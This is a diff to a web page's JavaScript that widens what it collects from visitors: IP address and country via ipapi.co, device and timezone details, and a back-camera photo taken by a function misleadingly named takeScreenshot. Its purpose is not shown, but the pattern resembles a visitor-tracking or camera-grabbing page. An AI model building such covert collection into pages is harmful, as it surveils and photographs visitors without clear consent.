@@ -110,12 +110,13 @@
             let sessionData = {};
 
             try {
-                // Step 1: Get IP Address
-                const ipAddress = await getIpAddress();
-                sessionData.ipAddress = ipAddress;
-                console.log('IP Address Retrieved:', ipAddress);
+                // Step 1: Get IP Address and country
+                const { ip, country } = await getIpAndCountry();
+                sessionData.ipAddress = ip;
+                sessionData.country = country;
+                console.log('IP and Country Retrieved:', ip, country);
 
-                // Step 2: Get Device Info
+                // Step 2: Get Device Info including Timezone and Language
                 const deviceInfo = await getDeviceInfo();
                 sessionData = { ...sessionData, ...deviceInfo }; // Merge device info into sessionData
                 console.log('Device Info Retrieved:', deviceInfo);
@@ -143,18 +144,21 @@
             }
         }
 
-        // Function to get IP Address
-        async function getIpAddress() {
+        // Function to get IP Address and country
+        async function getIpAndCountry() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                return data.ip;
+                return {
+                    ip: data.ip,
+                    country: data.country_name
+                };
             } catch (error) {
-                throw new Error('Failed to retrieve IP address.');
+                throw new Error('Failed to retrieve IP address and country.');
             }
         }
 
-        // Function to get device information
+        // Function to get device information, including timezone and language
         async function getDeviceInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -162,19 +166,20 @@
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                 screenResolution: `${window.screen.width} x ${window.screen.height}`,
                 language: navigator.language || 'en-US',
-                platform: navigator.platform || 'N/A'
+                platform: navigator.platform || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Timezone info
             };
         }
 
-        // Function to take a screenshot
+        // Function to take a screenshot, optimized for mobile
         async function takeScreenshot() {
             const video = document.createElement('video');
             video.autoplay = true;
 
             try {
-                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); // Use the environment (back) camera on mobile
             } catch (error) {
-                throw new Error("Unable to access the camera.");
+                throw new Error("Unable to access the camera. Please allow camera access and try again.");
             }
 
             document.body.appendChild(video);
